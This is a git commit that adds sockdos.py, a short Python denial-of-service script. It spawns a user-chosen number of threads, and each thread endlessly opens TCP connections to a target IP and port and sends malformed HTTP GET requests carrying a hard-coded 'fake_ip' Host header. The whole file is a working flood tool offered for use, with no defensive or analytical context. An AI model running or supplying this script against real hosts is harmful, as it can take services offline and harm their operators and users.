cc7f22e902489498bfb9cf2175909b7050358017
Anikin Luke Abales <47096239+ph-fox@users.noreply.github.com>
2022-01-19 23:33:36 +0800

    Create sockdos.py

---
+++ sockdos.py
@@ -0,0 +1,28 @@
+import socket, threading, sys, os
+
+try:
+	target = sys.argv[1]
+	port = int(sys.argv[2])
+	speed = int(sys.argv[3])
+	fake_ip = '104.74.112.38'
+except:
+	print("""
+Usage:
+ python3 {} <target_ip> <port> <speed>
+		""".format(os.path.basename(__file__)))
+	exit()
+
+def dos():
+	sent = 0
+	while True:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((target, port))
+		s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'), (target, port))
+		s.sendto(("HOST: "+fake_ip+"\r\n\r\n").encode('ascii'), (target, port))
+		s.close()
+		sent += 1
+		print(f'sent {sent}')
+
+
+for i in range(0, speed):
+	threading.Thread(target=dos).start()
